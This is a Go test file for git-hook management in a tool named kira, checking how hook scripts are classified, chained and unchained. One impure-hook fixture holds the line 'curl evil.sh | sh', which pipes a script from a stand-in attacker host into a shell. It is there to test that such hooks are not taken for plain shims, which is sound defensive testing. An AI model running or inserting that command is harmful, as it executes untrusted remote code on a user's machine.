package hooks_test

import (
	"strings"
	"testing"

	"github.com/shivamshivanshu/kira/internal/hooks"
)

// The embedded scripts must satisfy Invokes for the name they are installed
// under — this pins re-install idempotency to the actual script text.
func TestEmbeddedScriptsInvokeKira(t *testing.T) {
	for _, name := range append(append([]string{}, hooks.Default...), hooks.PreCommit) {
		script, ok := hooks.Script(name)
		if !ok {
			t.Fatalf("no embedded script for %q", name)
		}
		if !hooks.Invokes(script, name) {
			t.Errorf("Invokes(embedded %q) = false; script and predicate drifted", name)
		}
		installed, chained := hooks.Classify(script, name)
		if !installed || chained {
			t.Errorf("Classify(embedded %q) = (installed=%v, chained=%v), want (true, false)", name, installed, chained)
		}
	}
}

func TestClassifyChainedAndUnrelated(t *testing.T) {
	chained := hooks.Chain("#!/bin/sh\necho user\n", "post-merge")
	if installed, isChained := hooks.Classify(chained, "post-merge"); !installed || !isChained {
		t.Errorf("Classify(chained) = (%v, %v), want (true, true)", installed, isChained)
	}
	if installed, isChained := hooks.Classify("#!/bin/sh\necho user\n", "post-merge"); installed || isChained {
		t.Errorf("Classify(unrelated) = (%v, %v), want (false, false)", installed, isChained)
	}
}

func TestIsShellScript(t *testing.T) {
	yes := []string{"#!/bin/sh\n", "#!/usr/bin/env bash\n", "#!/bin/bash -e\n", "#!/usr/bin/env sh\n", "#!/bin/zsh\n"}
	no := []string{"#!/usr/bin/env fish\n", "#!/usr/bin/python3\n", "#!/usr/bin/env python\n", "not a script\n", ""}
	for _, c := range yes {
		if !hooks.IsShellScript(c) {
			t.Errorf("IsShellScript(%q) = false, want true", c)
		}
	}
	for _, c := range no {
		if hooks.IsShellScript(c) {
			t.Errorf("IsShellScript(%q) = true, want false", c)
		}
	}
}

func TestChainIdempotent(t *testing.T) {
	once := hooks.Chain("#!/bin/sh\necho x\n", "post-merge")
	if twice := hooks.Chain(once, "post-merge"); twice != once {
		t.Errorf("Chain not idempotent:\nonce=%q\ntwice=%q", once, twice)
	}
}

func TestInvokesMatchesLegacyAndRunForms(t *testing.T) {
	for _, content := range []string{
		"#!/bin/sh\nexec kira hooks post-merge \"$@\"\n",
		"#!/bin/sh\nexec kira hooks run post-merge \"$@\"\n",
	} {
		if !hooks.Invokes(content, "post-merge") {
			t.Errorf("Invokes(%q) = false, want true", content)
		}
	}
	if hooks.Invokes("#!/bin/sh\nexec kira hooks run post-merge \"$@\"\n", "pre-commit") {
		t.Error("Invokes must not match a different hook name")
	}
}

func TestIsPureShim(t *testing.T) {
	legacy := "#!/bin/sh\n# kira post-merge hook — delegates to the kira binary\nexec kira hooks post-merge \"$@\"\n"
	current, _ := hooks.Script("post-merge")
	pure := []string{
		current,
		legacy,
		strings.ReplaceAll(current, "\n", "\r\n"),
		"#!/bin/sh\nexec kira hooks run post-merge \"$@\"\n",
		"#!/bin/sh\n# hand-edited comment\nkira hooks run post-merge\n",
		"#!/bin/sh\n.kira/hooks/post-merge \"$@\"\n",
	}
	for _, content := range pure {
		if !hooks.IsPureShim(content, "post-merge") {
			t.Errorf("IsPureShim(%q) = false, want true", content)
		}
	}
	impure := []string{
		current + "echo extra\n",
		"#!/bin/sh\nmy-linter --staged\nexec kira hooks run post-merge \"$@\"\n",
		"#!/bin/sh\nkira hooks run post-merge \"$@\" && rm -rf tmp\n",
		"#!/bin/sh\ncommand -v kira || curl evil.sh | sh\nexec kira hooks run post-merge \"$@\"\n",
		hooks.Chain("#!/bin/sh\necho user\n", "post-merge"),
		"#!/bin/sh\necho user\n",
	}
	for _, content := range impure {
		if hooks.IsPureShim(content, "post-merge") {
			t.Errorf("IsPureShim(%q) = true; must not risk rewriting user content", content)
		}
	}
	if hooks.IsPureShim(current, "pre-commit") {
		t.Error("IsPureShim must not match a different hook name")
	}
}

func TestUnchainRestoresOriginal(t *testing.T) {
	for _, orig := range []string{
		"#!/bin/sh\necho user-hook-ran\n",
		"#!/bin/sh\necho no-trailing-newline",
	} {
		chained := hooks.Chain(orig, "post-merge")
		restored, changed := hooks.Unchain(chained, "post-merge")
		if !changed || restored != orig {
			t.Errorf("Unchain(Chain(%q)) = (%q, %v), want byte-identical original", orig, restored, changed)
		}
		if _, changed := hooks.Unchain(orig, "post-merge"); changed {
			t.Errorf("Unchain(%q) without a chain reported a change", orig)
		}
	}
}

func TestStateOf(t *testing.T) {
	script, _ := hooks.Script("post-merge")
	legacy := "#!/bin/sh\n# kira post-merge hook — delegates to the kira binary\nexec kira hooks post-merge \"$@\"\n"
	cases := []struct {
		name    string
		content string
		want    hooks.State
	}{
		{"current script", script, hooks.StateInstalled},
		{"chained onto user hook", hooks.Chain("#!/bin/sh\necho user\n", "post-merge"), hooks.StateChained},
		{"chained onto no-newline hook", hooks.Chain("#!/bin/sh\necho user", "post-merge"), hooks.StateChained},
		{"edited chain block", "# kira:chain v1\nsomething-else\n# /kira:chain\n", hooks.StateDrifted},
		{"legacy shim", legacy, hooks.StateDrifted},
		{"hand-edited shim", script + "echo extra\n", hooks.StateDrifted},
		{"foreign hook", "#!/bin/sh\necho user\n", hooks.StateForeign},
	}
	for _, c := range cases {
		if got := hooks.StateOf(c.content, "post-merge"); got != c.want {
			t.Errorf("StateOf(%s) = %q, want %q", c.name, got, c.want)
		}
	}
}
